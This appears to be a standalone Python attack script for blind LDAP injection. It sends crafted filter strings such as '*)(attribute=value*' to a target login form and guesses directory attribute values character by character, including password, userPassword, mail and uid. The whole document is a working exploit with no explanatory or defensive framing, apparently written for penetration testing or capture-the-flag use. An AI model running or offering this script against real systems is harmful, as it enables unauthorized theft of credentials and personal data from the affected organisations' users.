#!/usr/bin/env python3

import requests
import string
from time import sleep
import sys

proxy = { "http": "127.0.0.1:8080" }
url = str(input("Enter Target URL: "))
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            #sleep(0.5) #Avoid brute-force bans
            if "Cannot login" in r.text:
                value += str(char)
                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()
